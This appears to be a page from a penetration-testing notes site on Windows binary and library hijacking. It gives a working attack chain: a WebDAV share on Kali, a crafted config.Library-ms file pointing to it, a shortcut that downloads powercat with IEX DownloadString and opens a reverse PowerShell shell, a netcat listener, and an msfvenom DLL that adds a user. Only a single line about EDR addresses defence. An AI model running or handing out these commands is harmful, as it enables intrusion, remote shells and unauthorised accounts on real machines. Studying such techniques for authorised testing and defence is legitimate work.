---
layout: default
title: Binary Hijacking
parent: Windows
nav_order: 5
permalink: /windows/hijacking/
---

# Binary Hijacking
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Binary (.exe or .dll) Hijacking is a way of tricking a targeted system by implenting a custom binary, either an executable or a binary. This page will explain how to forge your own Windows library with a custom payload and to execute it on your targeted computer to gain an access to it.

## Prerequisites

* Find a way to make your custom library executed on the target (by doing Phishing or [Binary Hijacking](/windows/hijacking/) for example).
* Find an hijackable library with `WinPEAS` or `PowerSploit` functions like *Find-ProcessDLLHijack*, *Find-PathDLLHijack* and *Write-HijackDll*.

## Exploit

First, run a WebDAV share on your Kali environement.

```bash
# Install wsgidav.
pip3 install wsgidav
apt install python3-wsgidav

# Create a directory to use as the WebDAV share.
mkdir -p $HOME/webdav

# Run wsgidav.
wsgidav --host=0.0.0.0 --port=$port --auth=anonymous --root $HOME/webdav/
```

Then, create a custom Windows Library named `config.Library-ms`. Running this Windows Library will open previous WebDAV share in Windows Explorer.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!-- DO NOT MODIFY! -->
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"></libraryDescription>

<!-- DO NOT MODIFY! -->
<name>@windows.storage.dll,-34582</name>

<!-- Put whatever number you want -->
<version>6</version>

<!-- Pin to the navigation pane in Windows Explorer -->
<isLibraryPinned>true</isLibraryPinned>

<!-- Icon used to display the library (-1002 for Documents, -1003 for Pictures) -->
<iconReference>imageres.dll,-1003</iconReference>

<!-- Tags that will appear in Windows Explorer (Documents GUID below) -->
<!-- https://learn.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype -->
<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>

<searchConnectorDescriptionList>
		<searchConnectorDescription>
				<isDefaultSaveLocation>true</isDefaultSaveLocation>
				<isSupported>false</isSupported>
				<simpleLocation>
						<!-- Put the URL of the WebDAV share -->
						<url>http://$host:$port</url>
				</simpleLocation>
		</searchConnectorDescription>
</searchConnectorDescriptionList>
```

In the WebDAV share, we’ll create a `.Ink` shortcut for the target to execute:

1. On Windows, right-click on the Desktop.
2. Click on *New* then on *Shortcut*.
3. In the Create Shortcut window, put following payload.

```powershell
# This is an example, you can do whatever you want here.
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $lhost -p $lport -e powershell
```

1. Give a name to the shortcut and click ******Finish******.
2. Put the shortcut in the WebDAV share and make it executed by your target!
3. Do not forget to open your `netcat` listener.

```bash
nc -nlvp $lport
```

If you know your library will be execute with administration rights, you can directly create a new user on the machine using `msfvenom`.

```bash
msfvenom -p windows/adduser USER=$username PASS=$password -f dll -o $library.dll
```

## Recommendations

- [ ] Nothing to do here, simply enforce EDR on computers to detect and block anormal behavior.